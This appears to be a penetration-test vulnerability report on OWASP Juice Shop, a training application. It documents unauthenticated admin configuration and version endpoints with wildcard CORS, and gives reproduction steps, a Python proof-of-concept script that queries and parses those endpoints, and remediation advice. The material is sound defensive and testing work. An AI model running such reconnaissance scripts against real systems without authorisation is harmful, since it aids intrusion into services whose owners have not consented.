╭─ VULN-0001 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Unauthenticated Access to Administrative Configuration and Version   │
│  Endpoints                                                                   │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.5                                                             │
│                                                                              │
│  Target: http://juiceshop:3000                                               │
│                                                                              │
│  Endpoint: /rest/admin/application-configuration,                            │
│  /rest/admin/application-version                                             │
│                                                                              │
│  Method: GET, OPTIONS                                                        │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The application exposes administrative REST endpoints under /rest/admin/    │
│  that are accessible without any authentication or authorization checks. An  │
│  unauthenticated remote user can retrieve the full application               │
│  configuration via /rest/admin/application-configuration and determine the   │
│  exact deployed application version via /rest/admin/application-version.     │
│                                                                              │
│  The configuration response includes operational and security-relevant       │
│  settings (e.g., backup enablement, OAuth client identifiers and redirect    │
│  allowlists, feature flags, and other environment-specific details) that     │
│  should only be available to administrators. Additionally, the endpoints     │
│  return permissive CORS headers (Access-Control-Allow-Origin: *), enabling   │
│  cross-origin read access from arbitrary websites.                           │
│                                                                              │
│  Impact                                                                      │
│  An attacker can obtain sensitive configuration and environment metadata     │
│  without logging in, including security settings and integration details.    │
│  This materially increases the likelihood of successful downstream attacks   │
│  by enabling precise reconnaissance (e.g., identifying enabled/disabled      │
│  security features, enumerating OAuth redirect allowlists, and               │
│  fingerprinting the exact application version for targeted exploitation).    │
│  The permissive CORS policy further allows any third-party website to read   │
│  these responses in a browser context.                                       │
│                                                                              │
│  Technical Analysis                                                          │
│  The affected endpoints return HTTP 200 to unauthenticated requests (no      │
│  Cookie header, no Authorization header). This indicates missing             │
│  function-level authorization on administrative routes.                      │
│                                                                              │
│  Evidence highlights:                                                        │
│  The configuration endpoint returns a large JSON document containing         │
│  security/operational settings such as:                                      │
│  - config.application.localBackupEnabled: true                               │
│  - config.application.googleOauth.clientId:                                  │
│  1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com   │
│  - config.application.googleOauth.authorizedRedirects: includes              │
│  localhost/127.0.0.1 and other environment URIs                              │
│  - config.challenges.safetyMode: disabled (feature flag / security setting)  │
│                                                                              │
│  Both endpoints return Access-Control-Allow-Origin: * in the response. An    │
│  OPTIONS preflight response for the configuration endpoint also returns      │
│  Access-Control-Allow-Headers including authorization, indicating the admin  │
│  endpoint is intended to be callable via browser-based JavaScript but is     │
│  not access-controlled.                                                      │
│                                                                              │
│  PoC Description                                                             │
│  To reproduce:                                                               │
│                                                                              │
│  1. From any machine with network access to the application, send an         │
│  unauthenticated request to the admin configuration endpoint:                │
│     GET http://juiceshop:3000/rest/admin/application-configuration           │
│                                                                              │
│  2. Observe HTTP 200 OK and a JSON response containing configuration data    │
│  (e.g., localBackupEnabled, googleOauth clientId, authorizedRedirects,       │
│  safetyMode).                                                                │
│                                                                              │
│  3. Send an unauthenticated request to the admin version endpoint:           │
│     GET http://juiceshop:3000/rest/admin/application-version                 │
│                                                                              │
│  4. Observe HTTP 200 OK and a JSON response containing the deployed version  │
│  (e.g., {"version":"19.1.1"}).                                               │
│                                                                              │
│  Optional (CORS):                                                            │
│  5. Send an OPTIONS request to /rest/admin/application-configuration and     │
│  observe Access-Control-Allow-Origin: * and Access-Control-Allow-Headers     │
│  including authorization.                                                    │
│                                                                              │
│  PoC Code                                                                    │
│  import sys                                                                  │
│  import requests                                                             │
│                                                                              │
│  BASE = "http://juiceshop:3000"                                              │
│                                                                              │
│  ENDPOINTS = [                                                               │
│      "/rest/admin/application-configuration",                                │
│      "/rest/admin/application-version",                                      │
│  ]                                                                           │
│                                                                              │
│  def fetch(path: str) -> requests.Response:                                  │
│      url = BASE + path                                                       │
│      # Intentionally no cookies and no Authorization header                  │
│      return requests.get(                                                    │
│          url,                                                                │
│          headers={"Accept": "application/json"},                             │
│          timeout=10,                                                         │
│      )                                                                       │
│                                                                              │
│  def main() -> int:                                                          │
│      for path in ENDPOINTS:                                                  │
│          r = fetch(path)                                                     │
│          print(f"GET {path} -> {r.status_code}")                             │
│          print(f"Access-Control-Allow-Origin:                                │
│  {r.headers.get('Access-Control-Allow-Origin')}")                            │
│          ct = r.headers.get("Content-Type", "")                              │
│          print(f"Content-Type: {ct}")                                        │
│          print("Body (first 600 chars):")                                    │
│          print(r.text[:600])                                                 │
│          print("-" * 60)                                                     │
│                                                                              │
│      # Minimal parsing to demonstrate sensitive fields when config is        │
│  returned                                                                    │
│      r = fetch("/rest/admin/application-configuration")                      │
│      if r.status_code == 200 and "application/json" in                       │
│  (r.headers.get("Content-Type") or ""):                                      │
│          data = r.json()                                                     │
│          cfg = data.get("config", {})                                        │
│          app = cfg.get("application", {})                                    │
│          challenges = cfg.get("challenges", {})                              │
│          google = app.get("googleOauth", {})                                 │
│                                                                              │
│          print("Extracted fields (if present):")                             │
│          print("  localBackupEnabled:", app.get("localBackupEnabled"))       │
│          print("  googleOauth.clientId:", google.get("clientId"))            │
│          redirects = google.get("authorizedRedirects") or []                 │
│          if redirects:                                                       │
│              print("  googleOauth.authorizedRedirects (first 3):")           │
│              for x in redirects[:3]:                                         │
│                  print("   ", x)                                             │
│          print("  challenges.safetyMode:", challenges.get("safetyMode"))     │
│                                                                              │
│      return 0                                                                │
│                                                                              │
│  if __name__ == "__main__":                                                  │
│      sys.exit(main())                                                        │
│                                                                              │
│  Remediation                                                                 │
│  Enforce authentication and strict role-based authorization on all           │
│  administrative routes, including /rest/admin/application-configuration and  │
│  /rest/admin/application-version.                                            │
│                                                                              │
│  Implement deny-by-default access control for /rest/admin/* at the           │
│  routing/middleware layer so that:                                           │
│  - Unauthenticated requests consistently return 401/403                      │
│  - Non-admin authenticated users consistently return 403                     │
│                                                                              │
│  Reduce information exposure:                                                │
│  - Do not expose full runtime configuration to clients unless strictly       │
│  required; return only minimally necessary fields.                           │
│  - Avoid exposing precise application versions to unauthenticated users (or  │
│  gate version information behind admin access).                              │
│                                                                              │
│  Harden CORS:                                                                │
│  - Remove Access-Control-Allow-Origin: * from administrative endpoints.      │
│  - Restrict allowed origins to trusted administrative front-ends only, and   │
│  do not allow cross-origin reads for privileged resources.                   │
│                                                                              │
